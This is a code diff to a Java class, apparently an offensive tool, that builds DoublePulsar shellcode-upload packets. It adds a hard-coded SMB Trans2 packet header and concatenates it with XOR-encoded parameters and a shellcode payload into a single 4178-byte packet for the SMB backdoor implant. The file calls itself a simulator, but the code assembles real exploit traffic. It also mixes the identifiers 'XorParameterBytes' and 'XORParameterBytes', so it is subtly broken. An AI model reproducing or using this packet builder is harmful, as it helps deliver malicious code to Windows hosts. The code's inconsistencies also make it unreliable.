@@ -3,11 +3,24 @@ import java.util.*;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
+
 /*
 Doublepulsar payload generation simulator
 */
 
 public class DoublepulsarUploadShellcode {
+    
+    public static byte[] trans2_exec = new byte[]{
+            (byte) 0x00, (byte) 0x00, (byte) 0x10, (byte) 0x4e, (byte) 0xff, (byte) 0x53, (byte) 0x4d, (byte) 0x42,
+            (byte) 0x32, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x18, (byte) 0x07, (byte) 0xc0,
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
+            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x08, (byte) 0xff, (byte) 0xfe, (byte) 0x00,
+            (byte) 0x08, (byte) 0x42, (byte) 0x00, (byte) 0x0f, (byte) 0x0c, (byte) 0x00, (byte) 0x00, (byte) 0x10,
+            (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
+            (byte) 0x25, (byte) 0x89, (byte) 0x1a, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0c, (byte) 0x00,
+            (byte) 0x42, (byte) 0x00, (byte) 0x00, (byte) 0x10, (byte) 0x4e, (byte) 0x00, (byte) 0x01, (byte) 0x00,
+            (byte) 0x0e, (byte) 0x00, (byte) 0x0d, (byte) 0x10, (byte) 0x00
+        };
     
     public static byte[] byteXor(byte[] data, byte[] keyBytes) {
     byte[] result = new byte[data.length];
@@ -190,6 +203,15 @@ public class DoublepulsarUploadShellcode {
         System.out.println("Shellcode prepared successfully.");
         
         byte[] XorPayload = byteXor(hMem, byteXorKey);
+        
+        // Create a new byte array to hold all three byte arrays
+        byte[] doublepulsar_packet = new byte[4178];
+        System.arraycopy(trans2_exec, 0, doublepulsar_packet, 0, trans2_exec.length);
+        System.arraycopy(XorParameterBytes, 0, doublepulsar_packet, trans2_exec.length, XORParameterBytes.length);
+        System.arraycopy(XorPayload, 0, doublepulsar_packet, trans2_exec.length + XORParameterBytes.length, XorPayload.length);
+        
+        // Print out the merged array to verify (Optional)
+        System.out.println("Merged byte array length: " + doublepulsar_packet.length);
         
     }
 }
